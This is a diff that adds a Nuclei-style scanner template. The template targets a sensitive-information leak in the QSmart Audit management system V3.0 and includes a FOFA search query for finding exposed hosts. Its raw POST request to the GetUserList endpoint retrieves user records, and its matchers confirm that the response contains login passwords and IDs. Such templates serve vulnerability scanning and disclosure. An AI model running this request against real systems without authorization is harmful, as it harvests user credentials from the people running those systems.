@@ -1,0 +1,35 @@
+id: qsmart-audit-system-sensitive-info-leak
+
+info:
+  name: "QSmart Audit管理系统GetUserList接口敏感信息泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: title="QSmart Audit管理系统V3.0"
+
+    该系统存在敏感信息泄露漏洞，可能导致内部数据暴露。
+  tags: QSmart
+
+http:
+- raw:
+  - |
+    POST /service/SystemManageHandler.ashx?action=GetUserList HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/plain, */*; q=0.01
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    X-Requested-With: XMLHttpRequest
+
+    pageIndex=0&pageSize=20&sortField=&sortOrder=
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+      - 'LoginPwd'
+      - 'LoginCode'
+      - 'UserID'
+    condition: and
